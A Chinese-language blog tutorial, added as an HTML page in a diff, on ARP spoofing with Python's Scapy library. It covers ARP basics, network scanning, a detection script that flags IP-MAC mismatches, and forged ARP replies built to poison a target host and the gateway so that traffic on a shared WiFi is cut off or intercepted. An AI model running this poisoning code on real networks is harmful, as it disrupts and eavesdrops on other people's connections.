@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    
+    <title>Python实现ARP欺骗屏蔽局域网 | 无心而为</title>
+    
+    <link rel="alternative" href="/atom.xml" title="无心而为" type="application/atom+xml">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <link rel="stylesheet" href="/libs/fancybox/jquery.fancybox.css" charset="utf-8">
+    
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body class="site">
+    <header class="site-header">
+        <h1 class="site-title"><a href="/">无心而为</a></h1>
+        <nav class="site-nav">
+            <ul class="nav">
+                
+                <li><a href="/archives">Archives</a></li>
+                
+                
+                <li><a href="/atom.xml" title="RSS Feed">rss</a></li>
+                
+                <li><a class="toggle-search" href="#search">search</a></li>
+            </ul>
+        </nav>
+        <div class="site-search" id="search">
+            <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><input type="hidden" name="sitesearch" value="http://ymlog.cn"></form>
+        </div>
+        
+            <div class="site-header-background" style="background-image:url(http://reumia.github.io/hexo-theme-zzoman2015/images/background-zzoman2015.jpg)"></div>
+        
+    </header>
+    <div class="site-body">
+        <div class="global-width">
+    <article class="article" data-layout="post" data-slug="Python实现ARP欺骗屏蔽局域网">
+        <div class="article-content">
+            
+            
+            <header class="article-header">
+                <div class="article-meta">
+                    <a href="/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/" class="article-date">
+  <time datetime="2019-07-27T12:20:53.000Z">2019-07-27</time>
+</a>
+                    
+  <div class="article-category categories">
+    <a class="category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
+  </div>
+
+                    
+                </div>
+                
+    <h1 class="article-title" itemprop="name">
+      <a href="/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/">Python实现ARP欺骗屏蔽局域网</a>
+    </h1>
+
+            </header>
+            
+            <div class="article-body">
+                <center>Arp欺骗 ---- Python实现</center>
+## 简介
+    1、ARP是地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。
+    2、当计算机知道IP地址和MAC地址，就会向局域网中发送信息，默认发给默认网关，如果是发到局域网外的信息，则用源主机IP+目的
+    这两点是构造ARP毒化攻击的基本原理。
+----
+    ARP毒化攻击可以干什么？
+        ARP毒化可以让局域网内的消息都发往你指定的网关，简而言之就是让本地局域网全部断网，让连接同一个WiFi的设备都上不了网。
+
+<hr>
+<pre><code>如何做到的？
+计算机、手机、Ipad上网的数据传输发包格式为：
+源IP--自己的IP
+源MAC--自己的物理地址
+目的IP--如180.101.49.12 == www.baidu.com
+目的MAC--本地局域网的默认网关MAC
+
+1、目标主机通过ARP广播(由此可见ARP是用UDP协议实现)得到默认网关MAC地址
+2、攻击者通过不断地发送(默认网关IP+非默认网关MAC)的形式，更改目标主机中的ARP缓存表
+3、目标主机向默认路由发送消息
+4、消息在局域网内传播，但不会通过MAC地址流入默认路由器，故默认路由器也不会转发目标主机的消息，目标主机断网。
+
+即通过ARP毒化，让目标主机不能通过ARP协议，完成正确的地址映射。</code></pre><hr>
+<pre><code>攻击者如何向目标主机发送(默认网关IP+非默认网关MAC)？
+通过Python3的Scapy库来实现。</code></pre><h2 id="1、Scapy工具介绍"><a href="#1、Scapy工具介绍" class="headerlink" title="1、Scapy工具介绍"></a>1、Scapy工具介绍</h2><p>scapy官方文档</p>
+<blockquote>
+<p><a href="https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)</a></p>
+</blockquote>
+<pre><code>安装 pip install scapy</code></pre><p>Scapy可用于构造、发送、解析各类数据包。可以用来扫描，跟踪路由，探测，单元测试，攻击或网络发现。</p>
+<pre><code>默认包：以太网头部/IP头部/TCP头部
+pkg=Ehter()/IP()/TCP()
+pkg.show()</code></pre><p><strong>默认以太网头部</strong></p>
+<pre><code>###[ Ethernet ]### 
+dst= ff:ff:ff:ff:ff:ff
+src= 00:00:00:00:00:00
+type= IPv4</code></pre><p><strong>默认IP头部</strong></p>
+<pre><code>###[ IP ]### 
+     version= 4
+     ihl= None
+     tos= 0x0
+     len= None
+     id= 1
+     flags= 
+     frag= 0
+     ttl= 64
+     proto= tcp
+     chksum= None
+     src= 127.0.0.1
+     dst= 127.0.0.1
+     \options\</code></pre><p><strong>默认TCP头部</strong></p>
+<pre><code>###[ TCP ]### 
+        sport= ftp_data //默认20
+        dport= http            //默认80
+        seq= 0
+        ack= 0
+        dataofs= None
+        reserved= 0
+        flags= S
+        window= 8192
+        chksum= None
+        urgptr= 0
+        options= []</code></pre><h2 id="2、ARP协议简介"><a href="#2、ARP协议简介" class="headerlink" title="2、ARP协议简介"></a>2、ARP协议简介</h2><p>ARP协议实现IP（32bit）地址到MAC（48bit）地址之间的动态映射（由操作系统完成，用户不必关注），多路访问都会用到IP地址</p>
+<hr>
+<p><strong>实现的具体过程</strong></p>
+<pre><code>源主机发送ARP广播报文段，在报文段中填入自己的IP地址，目标的IP地址，以及自己的MAC地址
+
+同一个局域网内的主机都接受该报文段，并与自己的IP地址相比较
+如果相同，则发送ARP响应报文，在响应报文中填入自己的MAC地址等
+如果不同，则丢弃
+源主机接收到目标主机发出的ARP响应报文，放入ARP缓存表</code></pre><p><strong>scapy包结构</strong></p>
+<pre><code>###[ ARP ]### 
+        hwtype= 0x1         //硬件类型 1：Ethernet
+        ptype= IPv4            
+        hwlen= None
+        plen= None
+        op= who-has
+        hwsrc= 00:0c:29:ab:65:55    //hardware source 硬件源地址
+        psrc= 192.168.3.37                //源IP地址
+        hwdst= None                                //hardware destination 硬件目的地址
+        pdst= None                                //目的IP地址</code></pre><p><img src="https://i.loli.net/2019/08/30/DZQyihm8xXTkr5N.png" alt="ARP包结构"></p>
+<h2 id="3、Scapy实现ARP扫描"><a href="#3、Scapy实现ARP扫描" class="headerlink" title="3、Scapy实现ARP扫描"></a>3、Scapy实现ARP扫描</h2><pre><code>&apos;&apos;&apos;
+sr()  发一个，也可以接受好几个包
+sr1() 发一个包，可能会收到很多包，但我只接受第一个
+srp() 发多个，收多个，p代表工作在二层（以太网层）
+send() 只管发
+sendp() 需要手动填以太网的信息
+&apos;&apos;&apos;</code></pre><p>最基本的ARP请求响应</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">localmac=<span class="string">'00:0c:29:ab:65:55'</span></span><br><span class="line">localip=<span class="string">'192.168.3.37'</span></span><br><span class="line">destip=<span class="string">'192.168.3.31'</span></span><br><span class="line">destmac=destmac</span><br><span class="line"></span><br><span class="line">pkg=srp(Ether(src=localmac,dst=<span class="string">'FF:FF:FF:FF:FF:FF'</span>)/ARP(op=<span class="number">1</span>,hwsrc=localmac,hwdst=<span class="string">'00:00:00:00:00:00'</span>),iface=<span class="string">'ens32'</span>,verbose=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># op=1:ARP Request</span></span><br><span class="line"><span class="comment"># iface：网卡</span></span><br><span class="line"><span class="comment"># timeout:设置等待时间</span></span><br><span class="line"><span class="comment"># verbose：不打印输出</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ARP响应的解析—Scapy——ARP数据结构分析"><a href="#ARP响应的解析—Scapy——ARP数据结构分析" class="headerlink" title="ARP响应的解析—Scapy——ARP数据结构分析"></a>ARP响应的解析—Scapy——ARP数据结构分析</h3><p><img src="https://i.loli.net/2019/08/30/gzkyjEhnPbaBd6R.jpg" alt="scapy发收包的数据结构"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;pkg</span><br><span class="line"><span class="comment"># (&lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;) //元祖</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>]	//选择响应的ARP包</span><br><span class="line"><span class="comment"># &lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res //生成收发包的清单</span><br><span class="line"></span><br><span class="line"><span class="comment">#用列表容纳收发队列组成的元祖，对应一组计算机[</span></span><br><span class="line">第一个收发(</span><br><span class="line">	<span class="comment"># 发送的包&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=00:0c:29:ab:65:55 type=ARP |&lt;ARP  op=who-has hwsrc=00:0c:29:ab:65:55 psrc=192.168.3.37 pdst=192.168.3.31 |&gt;&gt;,</span></span><br><span class="line">	<span class="comment"># 接受的包&lt;Ether  dst=00:0c:29:ab:65:55 src=58:00:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=58:00:e3:d7:d5:ef psrc=192.168.3.31 hwdst=00:0c:29:ab:65:55 pdst=192.168.3.37 |&lt;Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |&gt;&gt;&gt;)]</span></span><br><span class="line"><span class="comment"># 元祖--包含了收发的所有包</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>] //选择第一个收发的包</span><br><span class="line"><span class="comment">#就对应一个计算机(</span></span><br><span class="line">&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> type=ARP |&lt;ARP  op=who-has hwsrc=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> |&gt;&gt;,</span><br><span class="line">&lt;Ether  dst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> src=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=<span class="number">0x1</span> ptype=IPv4 hwlen=<span class="number">6</span> plen=<span class="number">4</span> op=<span class="keyword">is</span>-at hwsrc=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> hwdst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> |&lt;Padding  load=<span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span> |&gt;&gt;&gt;</span><br><span class="line">)</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>] //选择响应的那一部分</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>].fields//选择响应的那一部分的以太网头部</span><br><span class="line"><span class="comment">#&#123;'dst': '00:0c:29:ab:65:55', 'src': '58:00:e3:d7:d5:ef', 'type': 2054&#125;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields //选择响应的那一部分的ARP头部</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	'hwtype': 1,</span></span><br><span class="line"><span class="string">	'ptype': 2048, </span></span><br><span class="line"><span class="string">	'hwlen': 6, </span></span><br><span class="line"><span class="string">	'plen': 4, </span></span><br><span class="line"><span class="string">	'op': 2, </span></span><br><span class="line"><span class="string">	'hwsrc': '58:00:e3:d7:d5:ef',</span></span><br><span class="line"><span class="string">	'psrc': '192.168.3.31', </span></span><br><span class="line"><span class="string">	'hwdst': '00:0c:29:ab:65:55', </span></span><br><span class="line"><span class="string">	'pdst': '192.168.3.37'</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'hwsrc'</span>]  //提取目标mac地址，也就是当前目标发包的源mac地址</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'psrc'</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><blockquote>
+<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
+</blockquote>
+<h2 id="4、Scapy监听ARP异常"><a href="#4、Scapy监听ARP异常" class="headerlink" title="4、Scapy监听ARP异常"></a>4、Scapy监听ARP异常</h2><ul>
+<li>建立正确的IP地址和MAC地址的映射数据库</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">'scapy.runtime'</span>).setLevel(logging.ERROR)<span class="comment">#清除报错</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ARP_Table <span class="keyword">import</span> ARP_Table <span class="comment"># 导入合法的IP-MAC映射关系</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arp_monitor_callback</span><span class="params">(pkt)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> ARP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ARP].op <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>):<span class="comment">#找到ARP数据包中操作码为1（who-has）或者2（is-at）的数据包）</span></span><br><span class="line">		<span class="keyword">if</span> ARP_Table.get(pkg[ARP].psrc):</span><br><span class="line">			<span class="keyword">if</span> ARP_Table[pkt[ARP].psrc] == pkt[ARP].hwsrc:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 不匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 未找到条码'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">	<span class="comment">#捕获数据包，通过arp_monitor_callback方法进行处理，filter过滤arp数据包，store=0，不保存数据，iface指定接口</span></span><br><span class="line">	sniff(prn=arp_monitor_callback,filter=<span class="string">'arp'</span>,store=<span class="number">0</span>,iface=<span class="string">'ens32'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="5、Scapy实现ARP的毒化攻击"><a href="#5、Scapy实现ARP的毒化攻击" class="headerlink" title="5、Scapy实现ARP的毒化攻击"></a>5、Scapy实现ARP的毒化攻击</h2><p>原理：</p>
+<p><img src="https://i.loli.net/2019/08/30/zKlWci79yTHxwQG.png" alt="攻击之前.png"></p>
+<p><img src="!%5B%E6%94%BB%E5%87%BB%E4%B9%8B%E5%90%8E.jpg%5D(https://i.loli.net/2019/08/30/rkwa8dRBtmoFWJT.jpg)" alt="攻击之后"></p>
+<p>所以，只需要修改A中的ARP缓存表，将与B对应的MAC修改。<br />于是，发给A的ARP响应报文格式应为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">目的IP：A</span><br><span class="line">目的MAC：A</span><br><span class="line">源IP：B</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>
+
+<p>就能实现上图功能。<br />紧接着，如果B要发消息给A，那么A中的ARP表可能会调整回正确的，于是可以向B发送ARP报文，格式为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">目的IP：B</span><br><span class="line">目的MAC：B</span><br><span class="line">源IP：A</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>
+
+<p>这样，B发往A的数据包也会走向C了，A，B双方的通信都将被C截获。<br />通常，B往往是路由器，所以B的IP地址一般是默认网关。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为默认网关的IP</span></span><br><span class="line"><span class="string">	源MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">	目的IP为需要毒化主机的IP</span></span><br><span class="line"><span class="string">	目的MAC为需要毒化主机的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pkgtoHost=Ether(src=localmac,dst=tgmac)/ARP(op=<span class="number">2</span>,hwsrc=localmac,psrc=gatewayip,hwdst=tgmac,pdst=tgip)</span><br><span class="line">gatewayMac=getmacbyip(gatewayip)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为被攻击主机的IP</span></span><br><span class="line"><span class="string">	源MAC为本机MAC</span></span><br><span class="line"><span class="string">	目的IP为默认网关的IP</span></span><br><span class="line"><span class="string">	目的MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pkgtoGateway=Ether(src=localmac,dst=gatewayMac)/ARP(hwdst=gatewayMac,pdst=gatewayip,psrc=tgip,hwsrc=localmac,op=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h2><blockquote>
+<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
+</blockquote>
+
+            </div>
+        </div>
+    </article>
+
+    
+    
+<nav class="article-nav">
+  
+    <a href="/2019/08/20/%E7%A6%85/" id="article-nav-newer" class="article-nav-link-wrap prev">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          禅
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/07/18/%E7%8E%A9%E8%BD%ACLinux/" id="article-nav-older" class="article-nav-link-wrap next">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">玩转Linux</div>
+    </a>
+  
+</nav>
+
+    
+
+    
+</div>
+    </div>
+    <footer class="site-footer">
+        <div class="global-width">
+            <ul class="site-widget">
+                
+                <li class="widget widget-tag">
+                    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/" rel="tag">快捷键</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+                </li>
+                
+                <li class="widget widget-category">
+                    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%B9%E5%99%A8/">容器</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/">路由技术</a><span class="category-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+                </li>
+                
+                <li class="widget widget-recent_posts">
+                    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-body">
+      <ul>
+        
+          <li>
+            <a href="/2020/12/30/%E6%84%BF%E6%9C%89%E6%B6%93%E6%B6%93%E8%AF%97%E6%84%8F%E6%B8%85%E6%96%B0%E5%85%A5%E8%84%BE%EF%BC%8C%E4%BB%A5%E9%A3%A8%E5%BF%99%E7%A2%8C%E7%9A%84%E6%97%A5%E5%B8%B8/">愿有涓涓诗意清新入脾，以飨忙碌的日常</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/16/Jetbrains%E5%BF%AB%E6%8D%B7%E9%94%AE/">Jetbrains快捷键</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/16/Chrome%E5%BF%AB%E6%8D%B7%E9%94%AE/">Chrome快捷键</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/16/VsCode%E5%BF%AB%E6%8D%B7%E9%94%AE/">VSCode快捷键</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/04/KVM%E5%AE%9E%E4%BE%8B/">KVM实例总结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+                </li>
+                
+            </ul>
+        </div>
+        <div class="site-info">
+            <address>
+                &copy; 2014 <a href="http://ymlog.cn">无心而为</a> All Right Reserved. <br/>
+                Powered by <a href="http://hexo.io" target="_blank" rel="noopener">Hexo</a>. Theme by <a href="http://zzoman.com" target="_blank" rel="noopener">ZZOMAN</a>
+            </address>
+        </div>
+    </footer>
+    
+    <script src="/libs/jquery-1.11.3.min.js" type="text/javascript"></script>
+    
+    <script src="/libs/fancybox/jquery.fancybox.js" type="text/javascript"></script>
+    
+    <script src="/js/site_init.js" type="text/javascript"></script>
+    
+</body>
+</html>
